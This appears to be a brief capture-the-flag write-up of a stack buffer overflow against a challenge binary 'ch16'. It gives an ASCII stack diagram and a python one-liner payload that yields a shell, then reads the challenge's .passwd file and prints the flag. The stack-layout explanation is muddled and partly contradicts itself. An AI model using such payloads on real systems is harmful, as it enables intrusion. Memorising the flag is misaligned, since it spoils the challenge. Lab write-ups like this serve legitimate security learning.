```
  char buffer[64];
  int check;
  int i = 0;
  int count = 0;
```

Stack would look like this:
```
------------
| buffer   | <= High adresses
|          |   \
|          |    \
|          |      64 bytes
|          |    /
|          |   /
|          |  / 
------------
| check    |
|          | <= Low adresses
------------
```

Stack grows from high to low adresses. So we can overflow check with address *buffer -4*.

```
 (python -c 'print("\x08\x08\x08\x08\xbc\xfa\xff\xbf")' && cat -) | ./ch16 
Enter your name: a  
/bin/bash: line 2: a: command not found
cat .passwd
Sm4shM3ify0uC4n
```

**Boom!**
